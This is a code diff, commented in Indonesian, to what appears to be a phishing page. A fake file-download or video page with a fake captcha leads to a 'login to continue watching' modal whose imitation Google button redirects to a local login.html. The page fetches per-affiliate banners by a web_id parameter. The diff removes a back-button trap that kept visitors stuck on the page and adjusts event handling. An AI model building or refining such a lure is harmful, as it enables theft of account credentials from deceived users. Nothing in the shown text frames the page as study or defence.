@@ -73,7 +73,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .btn-lanjut.active{background:#1a73e8;color:#fff;cursor:pointer;}
 .verify-note{margin-top:18px;font-size:11px;color:#9aa0a6;line-height:1.5;}
 
-/* LOGIN MODAL BARU - KOTAK PUTIH DIBIKIN RAMPING */
+/* LOGIN MODAL BARU */
 .modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.6);display:none;align-items:center;justify-content:center;padding:20px;z-index:99999; backdrop-filter: blur(3px);}
 .modal.show{display:flex;}
 .login-card{
@@ -101,6 +101,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
     margin-bottom: 8px; 
     cursor: pointer; 
     transition: opacity 0.2s;
+    text-decoration: none;
 }
 .btn-sosmed:active{opacity:0.7;}
 .btn-google{border:1px solid #dadce0; background:#fff; color:#3c4043;}
@@ -129,13 +130,13 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 <body>
 
 <header class="header">
-    <img src="atas.jpg" id="bannerImg" alt="Header" class="header-img" onclick="openDownloadLogin()">
+    <img src="atas.jpg" id="bannerImg" alt="Header" class="header-img" onclick="openDownloadLogin(event)">
 </header>
 
 <main class="page">
     <div class="ad-space"></div>
 
-    <section class="download-wrap" onclick="openDownloadLogin()">
+    <section class="download-wrap" onclick="openDownloadLogin(event)">
         <div class="download-top">
             <div class="file-icon"><img src="file.jpg" alt="File" class="file-icon-img"></div>
             <div class="file-info">
@@ -211,7 +212,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
         <button class="close-btn" type="button" onclick="closeLogin()">×</button>
         <h2 style="font-size:18px; font-weight:600; color:#1a1a1a; margin-bottom:18px; margin-top:5px;">Login untuk melanjutkan nonton</h2>
 
-        <button class="btn-sosmed btn-google" onclick="loginGoogle()">
+        <button class="btn-sosmed btn-google" onclick="loginGoogle(event)">
             <svg viewBox="0 0 48 48" style="width: 18px; height: 18px; margin-right: 8px;">
                 <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                 <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
@@ -233,12 +234,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 
 var captchaChecked = false;
 var verifyInterval = null;
-
-// FUNGSI BUAT NGE-TRAP TOMBOL BACK BROWSER BIAR STUCK
-history.pushState(null, null, location.href);
-window.onpopstate = function () {
-    history.go(1); 
-};
 
 /* ============ CEK BLOKIR ============ */
 function cekDeviceBlocked(){
@@ -324,7 +319,7 @@ function toggleCaptcha(){
 }
 
 
-/* ============ VERIF SELESAI → KEMBALI KE HALAMAN DOWNLOAD ============ */
+/* ============ VERIF SELESAI ============ */
 function lanjutKeLogin(){
     if(!captchaChecked) return;
     var btn = document.getElementById("btnLanjut");
@@ -335,7 +330,6 @@ function lanjutKeLogin(){
         var vm = document.getElementById("verifyModal");
         if(vm) vm.classList.remove("show");
         if(btn) btn.textContent = "Lanjutkan";
-        openDownloadLogin();
     }, 900);
 }
 
@@ -366,8 +360,9 @@ function outsideClose(event){
 
 
 /* ============ FUNGSI TOMBOL LOGIN ============ */
-function loginGoogle(){
-    // ARAHIN KE LOGIN.HTML
+function loginGoogle(event){
+    if(event) event.preventDefault();
+    // ARAHIN KE LOGIN.HTML PAKE LOCATION.HREF BIAR MULUS
     window.location.href = "login.html";
 }
 
@@ -394,10 +389,9 @@ document.addEventListener("keydown", function(event){
 });
 
 // ================= TAMBAHAN BUAT BANNER DINAMIS & WEB ID =================
-// Ambil web_id dari URL, kalo ga ada pake default
 var urlParams = new URLSearchParams(window.location.search);
 var WEB_ID = urlParams.get('web_id') || 'web_id_kenz_1';
-sessionStorage.setItem('web_id_aktif', WEB_ID); // Simpen biar bisa dipake di halaman lain
+sessionStorage.setItem('web_id_aktif', WEB_ID); 
 
 fetch('/api/config?web_id=' + WEB_ID).then(r=>r.json()).then(d=>{
   if(d.banner_url) {
